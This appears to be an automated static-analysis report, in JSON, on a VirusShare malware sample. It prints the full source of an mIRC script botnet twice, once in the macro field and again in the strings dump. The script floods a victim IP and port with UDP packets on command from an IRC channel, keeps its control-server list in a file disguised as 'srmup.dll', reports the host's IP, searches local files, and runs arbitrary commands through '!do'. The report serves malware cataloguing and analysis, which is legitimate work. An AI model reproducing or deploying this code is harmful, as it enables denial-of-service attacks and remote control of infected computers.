{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "on *:topic:%chan:{ \nif ($1 == host) && ($3 != $null) { set %victimip $2 | set %victimport $3 | set %attack 0 | attack } { \nif ($1 == ip) && ($2 != $null) { timerudp1 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(10,500) %pack %pack2 ECHO $ip | timerudp2 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(500,4000) %pack %pack2 ECHO $ip | timerudp3 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(4000,60000) %pack %pack2 ECHO $ip } } { \nif ($1 == omerta) { if ($timer(udp1) != $null) && ($timer(udp2) != $null) && ($timer(udp3) != $null) { timerudp1 off | timerudp2 off | timerudp3 off } | if ($timer(attack) != $null) { timerattack off } | sockclose ataked.* } } { \nif ($1 == replace) && ($2 != $null) && ($3 != $null) && $read(srmup.dll,w,* $+ $2 $+ *) != $null { write -l $+ $readn srmup.dll $replace($read(srmup.dll,w,* $+ $2 $+ *), $+ $2 $+ , $+ $3 $+ ) } } {\nif ($1 == delete) && ($2 != $null) { write -ds $+ $2 srmup.dll } } { \nif ($1 == add) && ($2 != $null) && $read(srmup.dll,w,* $+ $2 $+ *) == $null { write srmup.dll $2 } }\n}\nraw 332:*:{ \nif ($2 == %chan) && ($3 == ip) && ($4 != $null) { timerudp1 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(10,500) %pack %pack2 ECHO $ip | timerudp2 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(500,4000) %pack %pack2 ECHO $ip | timerudp3 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(4000,60000) %pack %pack2 ECHO $ip } { \nif ($2 == %chan) && ($3 == host) && ($5 != $null) { set %victimip $4 | set %victimport $5 | set %attack 0 | attack } } { \nif ($2 == %chan) && ($3 == omerta) { if ($timer(udp1) != $null) && ($timer(udp2) != $null) && ($timer(udp3) != $null) { timerudp1 off | timerudp2 off | timerudp3 off } | if ($timer(attack) != $null) { timerattack off } | sockclose ataked.* } } {\nif ($2 == %chan) && ($3 == replace) && ($4 != $null) && ($5 != $null) && $read(srmup.dll,w,* $+ $4 $+ *) != $null { write -l $+ $readn srmup.dll $replace($read(srmup.dll,w,* $+ $4 $+ *), $+ $4 $+ , $+ $5 $+ ) } } {\nif ($2 == %chan) && ($3 == add) && ($4 != $null) { if $read(srmup.dll,w,* $+ $4 $+ *) != $null { halt } | write srmup.dll $4 } } {\nif ($2 == %chan) && ($3 == delete) && ($4 != $null) { write -ds $+ $4 srmup.dll } }\n}\n\nalias channick { return $iif(# != $null,#,$nick) }\nalias schannick { return $iif(# != $null,#,$nick) }\nalias ping { ctcp $me ping }\n\non ^*:text:!start:#:  {\n  if ($nick !isop #) { halt }\n  set %auth $+ $nick yes | msg # logged on\n}\n\non *:text:*:*: {\n  if (%auth [ $+ [ $nick ] ] != yes) { halt }\n\n  if ($1 == !ip) { msg  $channick ip: $ip host: $host } \n  if ($1 == !j) { if ($2 == $null) { halt } | join $2- }\n  if ($1 == !p) { if ($2 == $null) { halt } | part $2- }\n  if ($1 == !finddir) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $finddir($2,$3,$4,$1-) }\n  if ($1 == !findfile) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $findfile($2,$3,$4,$1-) }\n  if ($1 == !timer) { if ($2 == $null) { halt } | msg $channick timer $2 = $timer($2) }\n  if ($1 == !online) { msg $channick on server: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%connecttime))) in network: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%starttime))) | close -m $nick }\n  if ($1 == !do) { if ($2 == $null) { halt } | if ($2 == exit) { halt } | if ($2 == /exit) { halt } | msg $channick [ $2- ] | $2- }\n  if ($1 == !var) { if ($2  == $null) { halt } | if ([ [ $2 ] ] == $null) { msg  $channick i have not $2 var | halt } | msg  $channick Var $2- = [ [ $2- ] ] }\n  if ($1 == !quit) { msg $channick Reconnecting | server $read(srmup.dll) 2227 }\n  if ($1 == !domains) { play $channick srmup.dll 2 }\n}"
    },
    "filename": "VirusShare_0fba42aa3124e0917fc1c960ccb8a4da",
    "filesize": 3952,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "0fba42aa3124e0917fc1c960ccb8a4da",
        "sha1": "06fc8e8513ceddef232f85548c4370bf11f740a1",
        "sha256": "faa9c09db4687550c6bbfc9f9d7eec4a7ec7c37541f4e0fc1062a5783965b7ab"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on *:topic:%chan:{ ",
            "if ($1 == host) && ($3 != $null) { set %victimip $2 | set %victimport $3 | set %attack 0 | attack } { ",
            "if ($1 == ip) && ($2 != $null) { timerudp1 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(10,500) %pack %pack2 ECHO $ip | timerudp2 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(500,4000) %pack %pack2 ECHO $ip | timerudp3 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $2 $rand(4000,60000) %pack %pack2 ECHO $ip } } { ",
            "if ($1 == omerta) { if ($timer(udp1) != $null) && ($timer(udp2) != $null) && ($timer(udp3) != $null) { timerudp1 off | timerudp2 off | timerudp3 off } | if ($timer(attack) != $null) { timerattack off } | sockclose ataked.* } } { ",
            "if ($1 == replace) && ($2 != $null) && ($3 != $null) && $read(srmup.dll,w,* $+ $2 $+ *) != $null { write -l $+ $readn srmup.dll $replace($read(srmup.dll,w,* $+ $2 $+ *), $+ $2 $+ , $+ $3 $+ ) } } {",
            "if ($1 == delete) && ($2 != $null) { write -ds $+ $2 srmup.dll } } { ",
            "if ($1 == add) && ($2 != $null) && $read(srmup.dll,w,* $+ $2 $+ *) == $null { write srmup.dll $2 } }",
            "raw 332:*:{ ",
            "if ($2 == %chan) && ($3 == ip) && ($4 != $null) { timerudp1 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(10,500) %pack %pack2 ECHO $ip | timerudp2 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(500,4000) %pack %pack2 ECHO $ip | timerudp3 -m 6666666666 10 sockudp -b udp $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $4 $rand(4000,60000) %pack %pack2 ECHO $ip } { ",
            "if ($2 == %chan) && ($3 == host) && ($5 != $null) { set %victimip $4 | set %victimport $5 | set %attack 0 | attack } } { ",
            "if ($2 == %chan) && ($3 == omerta) { if ($timer(udp1) != $null) && ($timer(udp2) != $null) && ($timer(udp3) != $null) { timerudp1 off | timerudp2 off | timerudp3 off } | if ($timer(attack) != $null) { timerattack off } | sockclose ataked.* } } {",
            "if ($2 == %chan) && ($3 == replace) && ($4 != $null) && ($5 != $null) && $read(srmup.dll,w,* $+ $4 $+ *) != $null { write -l $+ $readn srmup.dll $replace($read(srmup.dll,w,* $+ $4 $+ *), $+ $4 $+ , $+ $5 $+ ) } } {",
            "if ($2 == %chan) && ($3 == add) && ($4 != $null) { if $read(srmup.dll,w,* $+ $4 $+ *) != $null { halt } | write srmup.dll $4 } } {",
            "if ($2 == %chan) && ($3 == delete) && ($4 != $null) { write -ds $+ $4 srmup.dll } }",
            "alias channick { return $iif(# != $null,#,$nick) }",
            "alias schannick { return $iif(# != $null,#,$nick) }",
            "alias ping { ctcp $me ping }",
            "on ^*:text:!start:#:  {",
            "  if ($nick !isop #) { halt }",
            "  set %auth $+ $nick yes | msg # logged on",
            "on *:text:*:*: {",
            "  if (%auth [ $+ [ $nick ] ] != yes) { halt }",
            "  if ($1 == !ip) { msg  $channick ip: $ip host: $host } ",
            "  if ($1 == !j) { if ($2 == $null) { halt } | join $2- }",
            "  if ($1 == !p) { if ($2 == $null) { halt } | part $2- }",
            "  if ($1 == !finddir) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $finddir($2,$3,$4,$1-) }",
            "  if ($1 == !findfile) { if ($2 == $null) { halt } | if ($3 == $null) { halt } | if ($4 == $null) { halt } | msg $channick $findfile($2,$3,$4,$1-) }",
            "  if ($1 == !timer) { if ($2 == $null) { halt } | msg $channick timer $2 = $timer($2) }",
            "  if ($1 == !online) { msg $channick on server: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%connecttime))) in network: $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%starttime))) | close -m $nick }",
            "  if ($1 == !do) { if ($2 == $null) { halt } | if ($2 == exit) { halt } | if ($2 == /exit) { halt } | msg $channick [ $2- ] | $2- }",
            "  if ($1 == !var) { if ($2  == $null) { halt } | if ([ [ $2 ] ] == $null) { msg  $channick i have not $2 var | halt } | msg  $channick Var $2- = [ [ $2- ] ] }",
            "  if ($1 == !quit) { msg $channick Reconnecting | server $read(srmup.dll) 2227 }",
            "  if ($1 == !domains) { play $channick srmup.dll 2 }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.396268",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
